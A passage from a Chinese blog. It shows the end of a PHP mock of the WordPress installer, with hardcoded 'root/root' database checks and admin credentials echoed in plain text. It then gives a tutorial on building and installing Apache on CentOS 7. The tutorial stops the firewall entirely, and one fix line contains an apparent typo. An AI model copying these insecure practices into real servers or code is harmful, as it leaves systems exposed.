class="string">&lt;/select&gt;</span></span><br><span class="line"><span class="string">&lt;button type="submit" name="step" value="2"&gt;下一步&lt;/button&gt;   </span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="keyword">echo</span> $step1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第二步</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">step2</span><span class="params">()</span></span>&#123;</span><br><span class="line">$step1 = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;style&gt;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;body style="text-align: center;"&gt;</span></span><br><span class="line"><span class="string">&lt;form action="anzhuang.php" method="post"&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;欢迎使用&lt;/p&gt;</span></span><br><span class="line"><span class="string">	&lt;li&gt;数据库名&lt;/li&gt;</span></span><br><span class="line"><span class="string">	&lt;li&gt;数据库用户名&lt;/li&gt;</span></span><br><span class="line"><span class="string">	&lt;li&gt;数据库密码&lt;/li&gt;</span></span><br><span class="line"><span class="string">	&lt;li&gt;数据库主机&lt;/li&gt;</span></span><br><span class="line"><span class="string">	&lt;li&gt;数据表前缀（table prefix，特别是当您要在一个数据库中安装多个WordPress时）&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;我们会使用这些信息来创建一个&lt;code&gt;wp-config.php&lt;/code&gt;文件。	&lt;strong&gt;如果自动创建未能成功，不用担心，您要做的只是将数据库信息填入配置文件。您也可以在文本编辑器中打开&lt;code&gt;wp-config-sample.php&lt;/code&gt;，填入您的信息，并将其另存为&lt;code&gt;wp-config.php&lt;/code&gt;。&lt;/strong&gt;</span></span><br><span class="line"><span class="string">	需要更多帮助？&lt;a href="https://codex.wordpress.org/zh-cn:%E7%BC%96%E8%BE%91_wp-config.php"&gt;看这里&lt;/a&gt;。&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;绝大多数时候，您的网站服务提供商会给您这些信息。如果您没有这些信息，在继续之前您将需要联系他们。如果您准备好了…&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;button type="submit" name="step" value="3"&gt;现在就开始！&lt;/button&gt;   </span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="keyword">echo</span> $step1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第三步--&gt;填写基本信息，如果与数据库进行比对，出现错误跳转errorsql().</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">step3</span><span class="params">()</span></span>&#123;</span><br><span class="line">$step1 = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;style&gt;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;body style="text-align: center;"&gt;</span></span><br><span class="line"><span class="string">&lt;form action="jiaoyan.php" method="post"&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;请在下方填写您的数据库连接信息:&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;数据库名&lt;input type="text" name="sqlname" value="wordpress"&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;用户名&lt;input type="text" name="username" value="root"&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;密码&lt;input type="text" name="passwd" value="root"&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;数据库主机&lt;input type="text" name="sqlhost" value="localhost"&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;表前缀&lt;input type="text" name="tbname" value="wp_"&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;button type="submit" name="submit"&gt;提交&lt;/button&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="keyword">echo</span> $step1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第五步</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">successful</span><span class="params">()</span></span>&#123;</span><br><span class="line">$step1 = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;style&gt;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;body style="text-align: center;"&gt;</span></span><br><span class="line"><span class="string">&lt;form action="anzhuang.php" method="post"&gt;</span></span><br><span class="line"><span class="string">&lt;h1&gt;欢迎&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;欢迎使用著名的wordpress&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;h1&gt;需要信息&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;您需要填写一些基本信息&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;站点标题&lt;input type="text"&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;用户名&lt;input type="text" name="uname" value=""&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;密码&lt;input type="text" name="upasswd" value=""&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;您的电子邮件&lt;input type="text"&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;对搜索引擎的可见性&lt;input type="text"&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string"> &lt;button type="submit" name="step" value="6"&gt;安装WordPress&lt;/button&gt;  </span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="keyword">echo</span> $step1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第六步--&gt;设置自己登录所需要的用户名密码</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">success</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $uname;</span><br><span class="line"><span class="keyword">global</span> $upasswd;</span><br><span class="line">$step1 = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;style&gt;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;body style="text-align: center;"&gt;</span></span><br><span class="line"><span class="string">&lt;form action="anzhuang.php" method="post"&gt;</span></span><br><span class="line"><span class="string">&lt;h1&gt;成功&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;WordPress安装完成。谢谢！&lt;/p&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$step2 = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="comment">//&lt;button type="submit" name="step" value="7"&gt;登录&lt;/button&gt;</span></span><br><span class="line"><span class="keyword">echo</span> $step1.<span class="string">'&lt;p&gt;用户名：'</span>.$uname.<span class="string">'&lt;/p&gt;'</span>.<span class="string">'&lt;p&gt;密码：'</span>.$upasswd.<span class="string">'&lt;/p&gt;'</span>.$step2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//登陆界面</span></span><br><span class="line"><span class="comment">/*function wordpress()&#123;</span></span><br><span class="line"><span class="comment">$step1 = &lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="comment">&lt;html&gt;</span></span><br><span class="line"><span class="comment">&lt;head&gt;</span></span><br><span class="line"><span class="comment">&lt;title&gt;&lt;/title&gt;</span></span><br><span class="line"><span class="comment">&lt;/head&gt;</span></span><br><span class="line"><span class="comment">&lt;style&gt;</span></span><br><span class="line"><span class="comment">&lt;/style&gt;</span></span><br><span class="line"><span class="comment">&lt;body style="text-align: center;"&gt;</span></span><br><span class="line"><span class="comment">&lt;form action="anzhuang.php" method="post"&gt;</span></span><br><span class="line"><span class="comment">&lt;h1&gt;欢迎&lt;/h1&gt;</span></span><br><span class="line"><span class="comment">&lt;p&gt;欢迎使用著名的wordpress&lt;/p&gt;</span></span><br><span class="line"><span class="comment">&lt;p&gt;用户名&lt;input type="text" name="name" value=""&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment">&lt;p&gt;密码&lt;input type="text" name="passwd" value=""&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> &lt;button type="submit" name="step" value=""&gt;登陆&lt;/button&gt;  </span></span><br><span class="line"><span class="comment">&lt;/form&gt;</span></span><br><span class="line"><span class="comment">&lt;/body&gt;</span></span><br><span class="line"><span class="comment">&lt;/html&gt;</span></span><br><span class="line"><span class="comment">EOF;</span></span><br><span class="line"><span class="comment">echo $step1;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># jiaoyan.php #</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Created by PhpStorm.</span></span><br><span class="line"><span class="comment">     * User: Administrator</span></span><br><span class="line"><span class="comment">     * Date: 2018/12/16</span></span><br><span class="line"><span class="comment">     * Time: 15:45</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    @$step = $_POST[<span class="string">'step'</span>];</span><br><span class="line">    @$_POST[<span class="string">'sqlname'</span>];</span><br><span class="line">    @$_POST[<span class="string">'username'</span>];</span><br><span class="line">    @$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">    @$_POST[<span class="string">'sqlhost'</span>];</span><br><span class="line">    @$_POST[<span class="string">'tbname'</span>];</span><br><span class="line">    <span class="keyword">if</span> (@$_POST[<span class="string">'sqlname'</span>] == <span class="string">"wordpress"</span> &amp;&amp; @$_POST[<span class="string">'username'</span>] == <span class="string">"root"</span> &amp;&amp; @$_POST[<span class="string">'passwd'</span>] == <span class="string">"root"</span> &amp;&amp; @$_POST[<span class="string">'sqlhost'</span>] == <span class="string">"localhost"</span> &amp;&amp; @$_POST[<span class="string">'tbname'</span>] == <span class="string">"wp_"</span>)&#123;</span><br><span class="line">    errorwpconfig();</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(@$_POST[<span class="string">'sqlname'</span>] != <span class="string">"wordpress"</span> || @$_POST[<span class="string">'username'</span>] != <span class="string">"root"</span> || @$_POST[<span class="string">'passwd'</span>] != <span class="string">"root"</span> || @$_POST[<span class="string">'sqlhost'</span>] != <span class="string">"localhost"</span> || @$_POST[<span class="string">'tbname'</span>] != <span class="string">"wp_"</span>)&#123;</span><br><span class="line">    errorsql();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//第四步</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">errorwpconfig</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $step1 = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">    &lt;body style="text-align: center;"&gt;</span></span><br><span class="line"><span class="string">    &lt;form action="anzhuang.php" method="post"&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;抱歉，我不能写入wp-config.php文件&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;您可以手工创建wp-config.php文件，将下列文字粘贴于其中&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;textarea style="height: 50%;width: 50%;"&gt;sdwaasdwaasdwaasdw&lt;/textarea&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;在您做完这些之后，点击现在安装&lt;/p&gt;</span></span><br><span class="line"><span class="string">     &lt;button type="submit" name="step" value="5"&gt;现在安装&lt;/button&gt;  </span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    EOF;</span></span><br><span class="line"><span class="string">    echo <span class="subst">$step1</span>;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    //数据库信息错误</span></span><br><span class="line"><span class="string">    function errorsql()&#123;</span></span><br><span class="line"><span class="string">    <span class="subst">$step1</span> = &lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">    &lt;body style="text-align: center;"&gt;</span></span><br><span class="line"><span class="string">    &lt;form action="anzhuang.php" method="post"&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;1.xxxxx出错&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;2.xxxxx出错&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;3.xxxxx出错&lt;/p&gt;</span></span><br><span class="line"><span class="string">     &lt;button type="submit" name="step" value="3"&gt;返回上一步&lt;/button&gt;  </span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    EOF;</span></span><br><span class="line"><span class="string">    echo <span class="subst">$step1</span>;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    ?&gt;</span></span><br></pre></td></tr></table></figure>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://jaychouzzk.github.io/2018/12/03/CentOs7安装Apache服务/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Jaychouzzk">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Jaychouzzk's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/03/CentOs7安装Apache服务/" itemprop="url">在Cent os 7下Apache安装</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">發表於</span>
              
              <time title="創建於" itemprop="dateCreated datePublished" datetime="2018-12-03T16:00:45+08:00">
                2018-12-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="在Cent-os-7下Apache安装"><a href="#在Cent-os-7下Apache安装" class="headerlink" title="在Cent os 7下Apache安装"></a>在Cent os 7下Apache安装</h1><blockquote>
<p>使用软件：Vmware 14，Termius，FileZilla Client</p>
<p>安装环境：CentOs Linux release 7.2.1511</p>
<p>安装Apache版本：httpd-2.4.37</p>
</blockquote>
<h2 id="源码安装步骤："><a href="#源码安装步骤：" class="headerlink" title="源码安装步骤："></a>源码安装步骤：</h2><p><strong>将httpd-2.4.37.tar通过sftp上传到cent os的/root目录下</strong></p>
<p><img src="/img/apache-1.png" alt=""></p>
<p><strong>进入Termius中，通过SSH连接虚拟机</strong></p>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/img/apache-2.png" alt=""></h2><p><strong>将这四个文件传到虚拟机的/root目录下</strong></p>
<p><img src="/img/apache-3.png" alt=""></p>
<p><strong>先将gcc环境安装好</strong></p>
<pre><code>yum install gcc
</code></pre><p><img src="/img/apache-4.png" alt=""></p>
<p><strong>进入命令行模式，解压这四个文件,解压到默认目录下</strong></p>
<pre><code>tar zxvf apr-1.6.5.tar.gz
tar zxvf apr-util-1.6.1.tar.gz
tar zxvf pcre-8.42.tar.gz
tar zxvf pcre-8.42.tar.gz
</code></pre><p><img src="/img/apache-5.png" alt=""></p>
<hr>
<p><strong>1.<br>先安装apr-1.6.5</strong></p>
<pre><code>cd apr-1.6.5/
./configure --prefix=/usr/local/apr/
make &amp;&amp; make install
</code></pre><blockquote>
<p>如果遇到这个错误，请看下面错误解决<br><img src="/img/apache-6.png" alt=""></p>
</blockquote>
<hr>
<p><strong>2.<br>安装apr-util-1.6.1</strong></p>
<pre><code>cd apr-util-1.6.1/
./configure --prefix=/usr/local/apr-util/ --with-apr=/usr/local/apr/
make &amp;&amp; make install
</code></pre><blockquote>
<p>如果遇到了以下错误，请看下面错误解决<br><img src="/img/apache-7.png" alt=""></p>
</blockquote>
<hr>
<p><strong>3.<br>安装pcre-8.42</strong></p>
<pre><code>cd pcre-8.42
./configure
make &amp;&amp; make install
</code></pre><blockquote>
<p>如果出现以下错误，请看错误解决<br><img src="/img/apache-8.png" alt=""></p>
</blockquote>
<hr>
<p><strong>4.<br>安装httpd-2.4.37</strong></p>
<pre><code>cd httpd-2.4.37
./configure --prefix=/usr/local/apache2
make &amp;&amp; make install
</code></pre><blockquote>
<p>如果遇到以下错误，请看错误解决</p>
</blockquote>
<h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="/img/apache-9.png" alt=""></h2><p>安装完成</p>
<p>启动命令：</p>
<pre><code>/usr/local/apache2/bin/apachectl start
</code></pre><hr>
<p><img src="/img/apache-10.png" alt=""><br>缺少gcc的组件，执行命令</p>
<pre><code>yum -y install gcc gcc-c++ pcre-devel 
</code></pre><p>即可成功<br>然后进入</p>
<pre><code>/usr/local/apache2/bin/apachectl start
</code></pre><p><strong>即可运行apache服务<br>如果出现</strong><br><img src="/img/apache-11.png" alt=""></p>
<ul>
<li>服务也是开启的，只是一个告警，提示没有设置servername</li>
</ul>
<p>解决办法：可以在配置文件中配置 </p>
<pre><code>/usr/local/apache2/conf/httpd.conf
</code></pre><p><img src="/img/apache-12.png" alt=""></p>
<p><img src="/img/apache-13.png" alt=""></p>
<p>成功运行</p>
<h2 id="使用命令行安装Apache"><a href="#使用命令行安装Apache" class="headerlink" title="使用命令行安装Apache"></a>使用命令行安装Apache</h2><pre><code>yum install httpd

systemctl start httpd

systemctl enable httpd

firewall -cmd --add-service=http --permanent

firewall-cmd --reload

vim /var/www/html/index.html

//写入hello word
</code></pre><p><strong>关闭防火墙</strong></p>
<pre><code>systemctl stop firewalld
service iptables stop
</code></pre><p><img src="/img/apache-14.png" alt=""></p>
<p>在物理机中访问</p>
<p><img src="/img/apache-15.png" alt=""></p>
<p>成功配置完毕<br>附加一些配置命令：<br>    rm -f /etc/httpd/conf.d/welcome.conf   </p>
<pre><code>#删除默认欢迎页面

vi /etc/httpd/conf/httpd.conf       #自己配置环境
# line 86: 改变管理员的邮箱地址
ServerAdmin root@linuxprobe.org
# line 95: 改变域名信息
ServerName www.linuxprobe.org:80
# line 151: none变成All
AllowOverride All
# line 164: 添加只能使用目录名称访问的文件名
DirectoryIndex index.html index.cgi index.php
# add follows to the end
# server&apos;s response header（安全性）
ServerTokens Prod
# keepalive is ON
KeepAlive On
</code></pre><hr>
<h1 id="错误解决"><a href="#错误解决" class="headerlink" title="错误解决"></a>错误解决</h1><hr>
<h2 id="安装apr-1-6-5出现的错误"><a href="#安装apr-1-6-5出现的错误" class="headerlink" title="安装apr-1.6.5出现的错误"></a>安装apr-1.6.5出现的错误</h2><p><strong>错误</strong>：</p>
<pre><code>cannot remove ‘libtoolT’：no such file or directory
</code></pre><p><strong>解决</strong>：</p>
<pre><code>vim /root/apr-1.6.5/cofigure
    将RM=&quot;$RM&quot;    改为RM=&quot;$RM -f&quot;
    RM=&quot;rm&quot;        改为RM=&quot;$rm -f&quot;
</code></pre><h2 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="/img/apache-16.png" alt=""></h2><h2 id="安装apr-util-1-6-1出现的错误"><a href="#安装apr-util-1-6-1出现的错误" class="headerlink" title="安装apr-util.1.6.1出现的错误"></a>安装apr-util.1.6.1出现的错误</h2><p><strong>错误</strong>1:</p>
<pre><code>configure: error: APR could not be located. Please use the --with-apr option.
</code></pre><p><strong>解决</strong>：</p>
<pre><code>./configure --with-apr
或：./configure --prefix=/usr/local/apr-util/ --with-apr=/usr/local/apr/
</code></pre><hr>
<p><strong>错误</strong>2：</p>
<pre><code>checking for APR... configure: error: the 
    --with-apr parameter is incorrect. 
It must specify an install prefix, a build directory, or an apr-config file
</code></pre><p><strong>解决</strong>：</p>
<pre><code>./configure --prefix=/usr/local/apr --with-apr=/usr/local/apr/
</code></pre><hr>
<p><strong>错误</strong>3： </p>
<pre><code>make[1]: 进入目录“/usr/local/apr-util-1.6.1”
/bin/sh /usr/local/apr/build-1/libtool --silent --mode=compile gcc -g -O2 -pthread   -DHAVE_CONFIG_H -D_REENTRANT -D_GNU_SOURCE   -I/usr/local/apr-util-1.6.1/include -I/usr/local/apr-util-1.6.1/include/private  -I/usr/local/apr/include/apr-1    -o xml/apr_xml.lo -c xml/apr_xml.c &amp;&amp; touch xml/apr_xml.lo
xml/apr_xml.c:35:19: 致命错误：expat.h：没有那个文件或目录
 #include &lt;expat.h&gt;
编译中断。
make[1]: *** [xml/apr_xml.lo] 错误 1
make[1]: 离开目录“/usr/local/apr-util-1.6.1”
make: *** [all-recursive] 错误 1
</code></pre><p><strong>解决方法</strong>：</p>
<pre><code>yum install expat-devel
</code></pre><hr>
<h2 id="安装proc错误出现的错误"><a href="#安装proc错误出现的错误" class="headerlink" title="安装proc错误出现的错误"></a>安装proc错误出现的错误</h2><p><strong>错误</strong>：</p>
<pre><code>configure: error: Invalid C++ compiler or C++ compiler flags
</code></pre><p><strong>解决方法</strong>：</p>
<pre><code>yum -y install gcc gcc-c++ pcre-devel 
</code></pre><hr>
<h2 id="安装httpd出现的错误"><a href="#安装httpd出现的错误" class="headerlink" title="安装httpd出现的错误"></a>安装httpd出现的错误</h2><p><strong>错误</strong>：</p>
<pre><code>checking for APR-util... no
configure: error: APR-util not found.  Please read the documentation.
</code></pre><p><strong>解决方法</strong>：</p>
<pre><code>./configure --prefix=/usr/local/apache2 --with-apr-util=/usr/local/apr-util/
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  


          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Jaychouzzk</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">10</span>
                  <span class="site-state-item-name">文章</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">12</span>
                  <span class="site-state-item-name">標籤</span>
                
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Jaychouzzk</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 強力驅動</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主題 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>


        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
